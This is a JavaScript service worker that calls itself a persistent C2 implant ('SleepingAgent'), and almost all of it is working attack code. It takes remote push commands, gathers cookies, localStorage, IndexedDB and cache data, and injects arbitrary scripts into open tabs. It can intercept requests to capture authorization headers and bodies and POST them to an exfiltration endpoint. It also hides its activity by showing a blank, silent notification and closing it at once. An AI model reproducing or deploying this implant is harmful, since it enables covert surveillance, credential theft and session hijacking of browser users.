// SleepingAgent Service Worker - persistent C2 implant
 
const C2_EXFIL = '/exfil';
 
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
 
// ---- CORE: receive push command, execute, suppress notification ----
self.addEventListener('push', event => {
  let payload = { command: 'beacon' };
  try { payload = event.data.json(); } catch {}
 
  const task = handleCommand(payload).then(result => {
    return Promise.all([
      sendExfil(payload.command, result),
      suppressNotification()
    ]);
  });
 
  event.waitUntil(task);
});
 
// Notification suppression - THE BYPASS ATTEMPT
// Chrome spec requires a visible notification per push.
// We show one with blank content + silent:true, then immediately close it.
// Research question: does any notification appear on screen?
async function suppressNotification() {
  await self.registration.showNotification(' ', {
    body: ' ',
    silent: true,
    tag: 'sa',               // fixed tag - overwrites previous, no stacking
    requireInteraction: false,
    icon: '/favicon.ico'
  });
 
  // Immediately close before user can see it
  const notifs = await self.registration.getNotifications({ tag: 'sa' });
  notifs.forEach(n => n.close());
}
 
// ---- COMMAND HANDLER ----
async function handleCommand({ command, args }) {
  switch (command) {
 
    case 'beacon':
      return {
        alive: true,
        origin: self.location.origin,
        ts: Date.now()
      };
 
    case 'cookies':
      // SW cannot read document.cookie - must ask an open tab via bridge.js
      return await askClient('get_cookies');
 
    case 'localstorage':
      return await askClient('get_localstorage');
 
    case 'indexeddb':
      // SW can access IndexedDB directly - no open tab needed
      try {
        const dbs = await indexedDB.databases();
        return { databases: dbs.map(d => d.name) };
      } catch (e) {
        return { error: e.message };
      }
 
    case 'cache':
      // SW has full Cache Storage access - no open tab needed
      try {
        const names = await caches.keys();
        return { caches: names };
      } catch (e) {
        return { error: e.message };
      }
 
    case 'clients':
      const list = await self.clients.matchAll({ includeUncontrolled: true });
      return list.map(c => ({ id: c.id, url: c.url }));
 
    case 'intercept_on':
      self._intercept = true;
      return { intercepting: true };
 
    case 'intercept_off':
      self._intercept = false;
      return { intercepting: false };
 
    case 'inject':
      // Execute arbitrary JS in an open tab via bridge.js
      if (args && args.script) {
        return await askClient('inject', { script: args.script });
      }
      return { error: 'no script provided' };
 
    default:
      return { error: 'unknown command' };
  }
}
 
// ---- FETCH INTERCEPTION (enabled via intercept_on command) ----
self.addEventListener('fetch', event => {
  if (!self._intercept) return; // transparent by default
 
  const req = event.request.clone();
  req.text().then(body => {
    const auth = event.request.headers.get('authorization');
    if (body || auth) {
      sendExfil('intercept', {
        url: event.request.url,
        method: event.request.method,
        auth,
        body: body.substring(0, 500)
      });
    }
  }).catch(() => {});
  // Always pass through - do NOT block or modify requests (keeps it silent)
});
 
// ---- HELPERS ----
 
// Ask an open tab (via bridge.js) for data SW can't access directly
function askClient(action, data = {}) {
  return new Promise(async resolve => {
    const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
    if (!clients.length) {
      resolve({ error: 'no_tab_open', note: 'will execute on next visit' });
      return;
    }
    const channel = new MessageChannel();
    channel.port1.onmessage = e => resolve(e.data);
    clients[0].postMessage({ action, ...data }, [channel.port2]);
    setTimeout(() => resolve({ error: 'client_timeout' }), 3000);
  });
}
 
// POST data back to C2
async function sendExfil(command, data) {
  try {
    await fetch(C2_EXFIL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command, data, origin: self.location.origin, ts: Date.now() })
    });
  } catch {}
}
